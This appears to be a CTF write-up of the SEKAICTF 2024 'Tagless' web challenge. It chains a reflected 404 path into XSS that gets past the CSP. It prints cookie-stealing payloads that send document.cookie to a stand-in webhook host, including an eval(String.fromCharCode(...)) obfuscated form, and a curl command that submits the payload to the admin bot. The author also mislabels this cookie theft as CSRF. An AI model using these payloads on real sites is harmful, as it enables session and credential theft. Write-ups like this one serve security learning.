---
title: SEKAICTF 2024 Web Tagless

categories: [XSS, Web Pentest, CTF, Web, CSRF]

tags: [XSS, CSRF, Web, Pentest, Cookie, CTF]

image: /assets/img/uploads/sekai.png

---
# The Story
Another week , another ctf , this time i was abit occupied with some issues , only managed to join after the CTF ended.
# TLDR 
404 -> XSS -> Bypass CSP -> CSRF

## index.html
```html
<script src="/static/app.js">
```
mainpage of the website , nothing special other than this line at the bottom

## app.js
```js
function sanitizeInput(str) {
    str = str.replace(/<.*>/igm, '').replace(/<\.*>/igm, '').replace(/<.*>.*<\/.*>/igm, ''); 
    return str;
}
```
looks like XSS payload is sanitized 

## app.py
```js
@app.after_request
def add_security_headers(resp):
    resp.headers['Content-Security-Policy'] = "script-src 'self'; style-src 'self' https://fonts.googleapis.com https://unpkg.com 'unsafe-inline'; font-src https://fonts.gstatic.com;"
    return resp
```
looks like CSP is enforced in the header

```js
@app.route("/report", methods=["POST"])
def report():
    bot = Bot()
    url = request.form.get('url')
    if url:
        try:
            parsed_url = urlparse(url)
        except Exception:
            return {"error": "Invalid URL."}, 400
        if parsed_url.scheme not in ["http", "https"]:
            return {"error": "Invalid scheme."}, 400
        if parsed_url.hostname not in ["127.0.0.1", "localhost"]:
            return {"error": "Invalid host."}, 401
        
        bot.visit(url)
```
By accessing `/report` , using the parameter `url` and sending a `POST` request , the bot will be called to visit the `url`

```python
@app.errorhandler(404)
def page_not_found(error):
    path = request.path
    return f"{path} not found"
```
looking at `app.py` and notice that error handling page does not have validation for the `invalid path` 

Example : 
```bash
curl https://tagless.chals.sekai.team/notexist
/notexist not found 
```

## bot.js
```js
   def visit(self, url):
        self.driver.get("http://127.0.0.1:5000/")
        
        self.driver.add_cookie({
            "name": "flag", 
            "value": "SEKAI{dummy}", 
            "httponly": False  
        }) 
```
Here is where the flag is stored , inside a cookie and `httponly` is `False` which suggests that we can do `CSRF` since `httponly` normally set to `true` to prevent execuring js against the cookie

## What we have so far
- Injection point at -> 404
- post request contain manipulatable `url` that the bot will visit
## Issue
- CSP blocked js access

## CSP Bypass
```python
script-src 'self'; style-src 'self' https://fonts.googleapis.com https://unpkg.com 'unsafe-inline'; font-src https://fonts.gstatic.com;
```
**script-src :** limit js only can access from root domain directory  

**style-src :** this limit css only can load from google css

**unsafe-inline:** This allows the use of inline resources, such as inline `<script>` elements, javascript: URLs, inline event handlers, and inline `<style>` elements. 

**font-src :** font only can load from google

Reference : [github](https://github.com/bhaveshk90/Content-Security-Policy-CSP-Bypass-Techniques)

Example : 
```js
<script src=/script.js>
```

Online tool to check CSP
```
1. https://csp-evaluator.withgoogle.com/
2. https://cspvalidator.org/
```

![image](https://github.com/user-attachments/assets/c20185ec-1ea1-4404-9999-207bc54879b4)



## Crafted Payload Attempt 1

```js
<script src="/alert(document.domain)"></script>
```
technically this one should work since `/` is within domain directory

![[Pasted image 20240827035604.png]]
but we get this `Uncaught SyntaxError: unterminated regular expression literal` message

## Another Issue
```python
return f"{path} not found"
```
404 handler will return our input in `path` like this :

```js
/alert(1) not found
```
The `/` and `not found` makes our js invalid

## Crafted Payload Attempt 2
```js
<script src="/**/alert(document.domain)//"></script>
```
- Adding `/**/` in the front will comment out the `/`  
- Adding `//` at the end will comment the rest of the code effectively neglecting `not found`

Heres how the rendered payload will look like
```
//**/alert(document.domain)// not found
```
and with this we have a self reflected XSS

## CSRF Payload 
```js
<script src="/**/fetch(`https://webhook-link/?c=${document.cookie}`)//"></script>
```

## Final payload to send to admin

Before Encoding
```html
http://127.0.0.1:5000/<script src="/**/fetch(`https://webhook-link/?c=${document.cookie}`)//"></script>
```

Js compressor
https://jscompress.com/

Script to encode to ASCII
```javascript
function encode_to_javascript(string) {
            var input = string
            var output = '';
            for(pos = 0; pos < input.length; pos++) {
                output += input.charCodeAt(pos);
                if(pos != (input.length - 1)) {
                    output += ",";
                }
            }
            return output;
        }
        
let encoded = encode_to_javascript('<script src="/**/fetch(`https://webhook-link/?c=${document.cookie}`)//"></script>')
console.log(encoded)

// Note : this script intended to be run from browser console tool
```
paste the compressed code into the `encode_to_javascript('compressed-code-here')`

```html
http://127.0.0.1:5000/<script src="/**/eval(String.fromCharCode(60,115,99,114,105,112,116,32,115,114,99,61,34,47,42,42,47,102,101,116,99,104,40,96,104,116,116,112,115,58,47,47,119,101,98,104,111,111,107,45,108,105,110,107,47,63,99,61,36,123,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,125,96,41,47,47,34,62,60,47,115,99,114,105,112,116,62))>
```
Send this to the admin bot page that ask for url

Sending it using `POST` 
```bash
curl -X POST https://tagless.chals.sekai.team/ -d 'http://127.0.0.1:5000/<script src="/**/eval(String.fromCharCode(60,115,99,114,105,112,116,32,115,114,99,61,34,47,42,42,47,102,101,116,99,104,40,96,104,116,116,112,115,58,47,47,119,101,98,104,111,111,107,45,108,105,110,107,47,63,99,61,36,123,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,125,96,41,47,47,34,62,60,47,115,99,114,105,112,116,62))>'
```

Wait at webhook for a while and we get cookie flag response
```
SEKAI{w4rmUpwItHoUtTags}
```
